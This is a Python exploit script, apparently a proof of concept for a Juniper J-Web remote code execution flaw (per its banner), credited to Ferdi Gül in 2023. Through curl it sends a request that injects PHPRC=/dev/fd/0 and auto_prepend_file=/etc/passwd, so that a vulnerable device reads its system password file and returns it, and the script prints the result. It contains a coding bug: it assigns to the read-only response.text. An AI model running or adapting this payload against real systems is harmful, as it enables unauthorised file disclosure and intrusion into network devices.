import requests
import subprocess
from urllib.parse import urlparse
import argparse

def check_url(target_url):
    try:
        # Send HTTP GET request
        response = requests.get(target_url)
        response.raise_for_status()

        # Check request status
        print(f"Request Successful! Status Code: {response.status_code}")

        # Send curl request
        curl_process = subprocess.run(['curl', target_url, '-F', 'auto_prepend_file="/etc/passwd\n"', '-F', 'PHPRC=/dev/fd/0'],
                                      stdout=subprocess.PIPE, text=True)

        # Add curl process output to variable
        curl_output = curl_process.stdout

        # Extract content up to "<!DOCTYPE HTML PUBLIC"
        doctype_index = curl_output.find("<!DOCTYPE HTML PUBLIC")
        truncated_output = curl_output[:doctype_index]

        # Write truncated output to screen
        print(f"\n\nTruncated Curl Output:\n{truncated_output}")

        # Add truncated output into response.text
        response.text += f"\n\nTruncated Curl Output:\n{truncated_output}"

    except requests.RequestException as e:
        print(f"ERROR: {e}")
    except Exception as e:
        print(f"ERROR: An unexpected error occurred: {e}")

def main():
    print("""
       __ __  __ _   __ ____ ____   ______ ____         __ __  __ _   __ ____  _____    ____   ______ ______
      / // / / // | / //  _// __ \ / ____// __ \       / // / / // | / // __ \/ ___/   / __ \ / ____// ____/
 __  / // / / //  |/ / / / / /_/ // __/  / /_/ /  __  / // / / //  |/ // / / /\__ \   / /_/ // /    / __/   
/ /_/ // /_/ // /|  /_/ / / ____// /___ / _, _/  / /_/ // /_/ // /|  // /_/ /___/ /  / _, _// /___ / /___   
\____/ \____//_/ |_//___//_/    /_____//_/ |_|   \____/ \____//_/ |_/ \____//____/  /_/ |_| \____//_____/   

Written by Ferdi GÃ¼l @2023

""")
    parser = argparse.ArgumentParser(description="Check a URL using curl and requests.")
    parser.add_argument("-u", "--url", required=True, help="Target URL to check. Example: -u http://example.com")
    args = parser.parse_args()

    # Check if the URL is provided using -u parameter
    if not args.url.startswith("http"):
        print("ERROR: Please provide a valid URL starting with 'http' or 'https'.")
        return

    print(f"Checking URL: {args.url}")

    # Check URL using the function
    check_url(args.url)

if __name__ == "__main__":
    main()
